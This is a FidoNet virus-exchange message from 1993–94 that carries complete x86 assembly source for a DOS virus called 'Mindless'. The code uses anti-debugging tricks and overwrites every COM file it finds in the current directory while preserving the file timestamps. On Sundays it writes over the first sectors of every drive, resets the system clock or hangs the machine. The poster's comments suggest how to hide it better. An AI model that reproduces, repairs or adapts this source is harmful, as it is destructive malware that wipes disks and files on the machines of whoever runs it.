;ฤ PVT.VIRII (2:465/65.4) ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ PVT.VIRII ฤ
; Msg  : 30 of 54
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:14
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : MINDLESS.ASM
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
;.RealName: Max Ivanov
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ญไฎpฌ ๆจ๏ ฎ ขจpใแ ๅ)
;* From : Fred Lee, 2:283/718 (06 Nov 94 16:51)
;* To   : Gilbert Holleman
;* Subj : MINDLESS.ASM
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Fred.Lee@f718.n283.z2.fidonet.org
;



mindless   segment byte
           assume cs:mindless,ds:mindless,ss:mindless

        org     100h

victem  equ     09Eh

yam     proc near

        jmp     virus_fix       ;location of victem name
yam     endp

virus_fix proc near
                                ;attempt crashing debugger
        mov     cx,09ebh        ;fake command
        mov     ax,0fe05h       ;fake command
        jmp     short $-2       ;do real commands

        adc     ah,3bh          ;fake command
        jmp     short $-10      ;do real commands


        push    ds
        xor     ax,ax           ;instead of XORring ax, you
                                ;should work out it's alue
                                ;after the above mess, then
                                ;subtract it so noone knows
                                ;it's real value.

        push    ax
        mov     ah,2ah          ;Get system date
        int     21h

        cmp     al,0            ;Is it Sunday?
        jne     not_sunday      ;not sunday?  no damage then..

start_damage:
        mov     ax,3301h        ;
        xor     dl,dl           ;determine ctrl/break state
        int     21h

        mov     cx,msg_length   ;prepare to write our messag
        lea     si,message      ;These are the bytes to move

decrypt_message:
        mov     al,byte ptr [si] ;get byte to decrypt
        xor     al,1            ;xor it with 1
       mov     byte ptr [si],al ;store it
        inc     si              ;go to next cypher
        loop    decrypt_message ;get another character

damage:
        cmp     byte ptr drive_num,27 ;have we past drive z?
        ja      no_more_disks   ;if yes, exit damage routine
        pushf                   ;don't let flags be altered
        mov     al,byte ptr drive_num
        mov     cx,word ptr num_secs
        xor     dx,dx           ;first sector
        lea     bx,message      ;data to write
        int     26h             ;absolute write to disk
        popf                    ;restore flags
        inc     byte ptr drive_num ;try another drive
        jmp     short damage    ;

no_more_disks:
        mov     dl,2ch          ;check ctrl/C state
        int     21h
        and     dl,0fh
        or      dl,dl           ;Set Flags
        je      hang_machine
        mov     cx,1980         ;prepare system year
        xor     dx,dx           ;prepare system month and day
        mov     ah,2bh          ;Set system date
        int     21h
        xor     cx,cx           ;prepare system hour/minute
        xor     dx,dx           ;prepare system seconds
        mov     ah,2dh          ;Set system time
        int    21h
        mov     ax,3301h        ;check/set ctrl/C status
        mov     dl,01
        int     21h
        mov     ax,4c00h        ;Drop to DOS, no error code
        int     21h

;
;


hang_machine:
        jmp     $

not_sunday:
        mov     al,dl
        mov     dl,0c0h
        push    ds
        mov     bx,78h
        xor     ax,ax
        mov     ds,ax          ; ds=0
        mov     ax,word ptr [bx]
        mov     bx,ax
        mov     al,byte ptr [bx]
        and     al,0fh
        or      al,dl
        mov     byte ptr [bx],al
        xor     ah,ah           ;reset drive
        int     13h
        pop     ds              ;restore ds

        push    ds              ;keep it stored, though
        mov     bx,78h
        xor     ax,ax
        mov     ds,ax           ;ds=0
        mov     ax,word ptr [bx]
        mov     bx,ax
        mov     al,byte ptr [bx]
        pop     ds              ;restore ds

        push    ax
        mov    bx,0fah         ;ultra hi speed??
        mov     ax,0305h        ;Adjust keyboard rate/delay
        int     16h

        mov     ax,4e00h        ;DOS Search_First
        lea     dx,com_file     ;Look for a COM file
        int     21h

infect:
        mov     ax,4300h        ;get/set file attribs
        mov     dx,offset victem
        int     21h
        mov     ax,4301h        ;get/set file attribs
        and     cx,00feh        ;
        int     21h
        mov     ax,3d01h        ;open file
        mov     dx,offset victem
        int     21h
       mov     bx,ax           ;file handle
        mov     ax,5700h        ;get file time
        int     21h
        push    cx               ;store it
        push    dx               ;stor it
        mov     dx,0100h
        mov     cx,01a7h
        mov     ah,40h
        int     21h              ;write file using file handle
        pop     dx
        pop     cx
        mov     ax,5701h
        int     21h              ;set file date & time
        mov     ah,3eh           ;close file via handle
        int     21h
        mov     ah,4fh           ;DOS Search_Next
        int     21h
        ja      infect           ;infect if good one found
        int     20h              ;bail out

drive_num db    0
num_secs  dw    20              ;should be enough to kill with

com_file  db     '*.COM',0      ;'*.c*' leaves too much room
                                        ; for error.

;       This was not encrypted properly!!
;       I have corrected what I could figure out.

message db      0fah            ;??What's this??

        db      'Xntmfrsddr!'   ;Youngsters
        db      '@f`hmrs!'      ;Against
        db      'Lb@eedd'       ;McAffee

        db      '\!,'
        db      'O@U@R!L@TO@T' ;NATAS KAUPAS

        db      0ffh,0ffh       ;spaces (cr/lf not useful...)

        db     'Uid!Lhoemdrr!Whstr!w1/0!' ;virus name, version
msg_length equ  $-message


virus_fix  endp
mindless   ends
           end     yam

;-+-  Terminate 1.50/Pro
; + Origin: <Rudy's Place - Israel> Hard disks never die... (2:283/718)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    þ The MeยeO
;
;/P[=NNNNN]    Pack code segments
;
;--- Aidstest Null: /Kill
; * Origin: ๙PVT.ViRII๚main๚board๚ / Virus Research labs. (2:5030/136)

